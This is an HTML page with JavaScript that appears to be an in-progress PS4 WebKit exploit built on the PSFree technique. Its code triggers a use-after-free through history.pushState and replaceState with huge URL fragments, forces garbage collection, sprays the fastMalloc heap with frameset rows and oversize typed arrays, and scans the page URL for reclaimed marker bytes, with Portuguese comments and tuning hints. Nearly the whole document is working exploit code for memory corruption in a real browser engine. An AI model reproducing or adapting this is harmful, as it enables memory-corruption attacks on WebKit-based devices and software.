<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Final PSFree Strategy</title>
<style>
    body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
    button { 
        font-size:14px; padding:12px; margin:5px; 
        background:#222; color:#0f0; border:1px solid #0f0; cursor:pointer; width: 320px;
    }
    button:hover { background:#0f0; color:#000; }
    #log { white-space: pre-wrap; border-top: 1px solid #333; margin-top: 20px; }
</style>
</head>
<body>
<h2>PS4 WebKit – fastMalloc Exhaustion</h2>
<div id="status">Ready</div>
<button onclick="runStepD()">RUN PSFREE RECLAMATION</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

// Técnica do psfree.mjs: Força o Garbage Collector
function gc() {
    log("Forcing GC...");
    for(let i=0; i<10; i++) {
        new Uint8Array(4 * 1024 * 1024); 
    }
}

async function triggerBaseUAF() {
    logEl.textContent = "";
    log("=== STARTING STABLE UAF (i < 48) ===");
    let size = 977;
    const STEP = 14461;
    for(let i=0; i<48; i++){
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
        size += STEP;
        await sleep(5);
    }
    await sleep(40);
}

async function runStepD() {
    await triggerBaseUAF();
    
    // 1. Limpa a Heap antes de sprayar (Essencial no PSFree)
    gc();
    
    log("Spraying fastMalloc via Framesets...");
    let sprayFrames = [];
    
    // Técnica do psfree.mjs: Alocação via frameset.rows
    // Isso entra na partição fastMalloc
    const rowsPattern = ",".repeat(254); 
    for(let i = 0; i < 400; i++) {
        let fset = document.createElement("frameset");
        fset.rows = rowsPattern; // Dispara makeUniqueArray
        sprayFrames.push(fset);
    }

    log("Spraying Oversize Arrays...");
    let sprayArrays = [];
    // Técnica do memtools.mjs: Oversize alocação (> 1000 bytes)
    const TARGET_SIZE = 340356; 
    for(let i = 0; i < 200; i++) {
        let a = new Uint32Array(TARGET_SIZE / 4);
        a.fill(0x41424344); // 'ABCD'
        sprayArrays.push(a);
    }

    window.keepAlive = [sprayFrames, sprayArrays];
    await sleep(50);

    let url = document.URL;
    log("Scanning offsets for Reclamation...");
    
    let found = false;
    // Buscando o marcador 0x44 (D de ABCD)
    for(let off = 34; off < 5000; off++) {
        let code = url.charCodeAt(off);
        if(code === 0x44 || code === 0x41) {
            log("SUCCESS! Reclaimed memory at [" + off + "]: 0x" + code.toString(16).toUpperCase());
            found = true;
            break;
        }
    }
    
    if(!found) {
        log("Falha: Memória ainda presa em 'V' ou URL.");
        log("DICA: Tente aumentar o TARGET_SIZE para 400000.");
    }
}
</script>
</body>
</html>
